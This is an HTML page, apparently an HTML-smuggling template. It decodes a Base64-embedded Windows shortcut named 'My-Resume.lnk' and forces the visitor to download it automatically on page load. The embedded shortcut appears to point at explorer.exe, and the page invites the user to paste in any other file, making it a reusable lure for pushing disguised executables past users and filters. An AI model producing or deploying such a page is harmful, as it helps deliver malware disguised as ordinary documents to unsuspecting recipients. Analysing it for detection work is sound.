<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Auto Download - Base64 Decoded Blob</title>
</head>
<body>
    <h1>File downloading automatically...</h1>
    <p>If the download doesn&#39;t start, <a href="#" id="manual-download">click here</a>.</p>

    <script>
        // ================================================================
        // STEP 1: Paste your Base64-encoded file content here
        // ================================================================
        const BASE64_DATA ='TAAAAAEUAgAAAAAAwAAAAAAAAEbxAQAAAAAAAADbkfTn/9wBANuR9Of/3AEA25H05//cAQAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAALcAFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAPAAyAAAAAADTXFZkEABXaW5kb3dzACYAAwAEAO++01xWZNNcVmQUAAAAVwBpAG4AZABvAHcAcwAAABYATAAyAAAAAADTXFZkEABleHBsb3Jlci5leGUAADAAAwAEAO++01xWZNNcVmQUAAAAZQB4AHAAbABvAHIAZQByAC4AZQB4AGUAAAAcAAAAAwBDADoAXAADAEMAOgBcABcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAGUAeABwAGwAbwByAGUAcgAuAGUAeABlAAAAAAA=';

        // ================================================================
        // STEP 2: Configure the output filename and MIME type
        // ================================================================
        const OUTPUT_FILENAME = 'My-Resume.lnk';
        const OUTPUT_MIME    = 'application/octet-stream';

        // ================================================================
        // Decode Base64 → Blob → Auto-download
        // ================================================================
        function decodeBase64AndDownload(base64, filename, mimeType) {
            // Decode Base64 to binary string
            const binaryString = atob(base64);

            // Convert binary string to Uint8Array
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }

            // Create the Blob
            const blob = new Blob([bytes], { type: mimeType });

            // Create object URL and trigger download
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            setTimeout(() => URL.revokeObjectURL(url), 100);
        }

        // ================================================================
        // Auto-download on page load
        // ================================================================
        window.addEventListener('DOMContentLoaded', function() {
            if (BASE64_DATA) {
                decodeBase64AndDownload(BASE64_DATA, OUTPUT_FILENAME, OUTPUT_MIME);
            } else {
                document.body.innerHTML = `
                    <h2 style="color:red;">No Base64 data found!</h2>
                    <p>1. Encode your file to Base64 (see instructions below).</p>
                    <p>2. Paste the Base64 string into the <code>BASE64_DATA</code> variable in this HTML file.</p>
                    <p>3. Set the <code>OUTPUT_FILENAME</code> and <code>OUTPUT_MIME</code> as needed.</p>
                    <p>4. Re-open this page in a browser.</p>
                `;
            }
        });

        // Also allow manual trigger via the link
        document.getElementById('manual-download')?.addEventListener('click', function(e) {
            e.preventDefault();
            if (BASE64_DATA) {
                decodeBase64AndDownload(BASE64_DATA, OUTPUT_FILENAME, OUTPUT_MIME);
            }
        });
    </script>

</body></html>
